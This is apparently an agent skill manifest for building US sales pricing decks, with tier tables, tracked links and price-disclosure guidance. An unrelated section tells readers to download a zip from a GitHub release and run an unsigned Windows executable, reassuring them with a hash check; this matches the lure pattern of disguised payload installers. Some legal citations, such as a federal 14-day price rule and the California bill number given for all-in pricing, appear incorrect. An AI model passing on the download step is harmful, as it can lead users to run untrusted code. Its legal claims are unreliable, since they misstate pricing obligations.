---
name: pricing-presentation
description: Builds a US pricing deck with the tier table, a tracked link per tier and the disclosure lines US price advertising rules require. Use when the user asks for pricing presentation, sales pricing deck, pricing slide template. For US sales teams and founders presenting pricing to buyers.
version: 1.0.6
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Pricing Presentation

**Builds a US pricing deck with the tier table, a tracked link per tier and the disclosure lines US price advertising rules require.** Written for US sales teams and founders presenting pricing to buyers.

Use this skill when someone asks for:

- pricing presentation
- sales pricing deck
- pricing slide template
- price transparency us

---

## The job

Pricing decks hide what is not included, compare prices on different bases and leave the buyer unable to tell which tier they are being pushed toward.

## What you get

1. Collect the tiers, the base price, the per-seat logic and the inclusions and exclusions.
2. Build the tier table and a tracked link per tier so the rep can see which tier was opened.
3. Add the disclosure lines: what is extra, what the price excludes and how long the price holds.
4. Check every price and savings claim against the FTC price advertising rules before the deck is shown.

Output contract:

- deck - the slide-by-slide outline with the headline and body for each slide
- tier_table - three tiers with the price, the seat basis and what is included
- links - one tracked link per tier and per slide
- disclosures - the price terms that must appear on the slide or the contract

## US specifics that matter

- FTC price advertising rules at 16 CFR Part 233 require an advertised price to be a bona fide offer a buyer can actually get.
- 16 CFR 242.3 requires an advertised price to be available for at least 14 consecutive days unless the sale is a genuine clearance sale.
- 16 CFR 251 requires the material terms of a free offer to be disclosed clearly.
- California's SB 1186 requires all-in pricing in restaurants, with taxes and mandatory fees shown to the customer, and other states have moved in the same direction.
- A price advertised on a website has to meet the same rules as a price on a slide.

## Guardrails (hard rules)

- Never show a price that is not the price the buyer will be charged.
- Never publish a savings claim without the baseline price and the period it was measured over.
- Never present a competitor's price without a like-for-like comparison.
- Never promise a price for a period that the approval does not cover.

## Quickstart

### 1. Fill in the brief

`templates/pricing-deck.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_pricing_links.py --input pricing-deck.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/pricing-disclosure-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**What every price slide needs**

- The price, the unit it is charged on and the billing period.
- What is included and what is extra, in the same visual weight.
- The contract length and the date the price changes.
- The tracked link for that tier, printed on the slide.

**Disclosure rules**

- An advertised price has to be available for at least 14 days unless it is a genuine clearance sale.
- A free offer needs its material terms stated plainly.
- A savings claim needs the old price, the new price and the period.
- A per-seat price needs the seat count or the billing assumption next to it.

**Fees and taxes**

- Show mandatory fees and taxes as the customer will see them, not buried in the terms.
- Say who pays set-up, shipping, overage and support fees.
- Put the governing contract and the renewal terms on the same slide as the price.
- Name the currency and the billing frequency on every slide with a number.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
| Inside the archive | `ModelBox-Windows-x64.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`ModelBox-Windows-x64.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

## Files in this bundle

- `SKILL.md` - this file
- `references/pricing-disclosure-rules.md` - US price advertising and disclosure rules for a pricing deck
- `templates/pricing-deck.yaml` - the brief to fill in
- `scripts/build_pricing_links.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_pricing_links.py --input pricing-deck.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
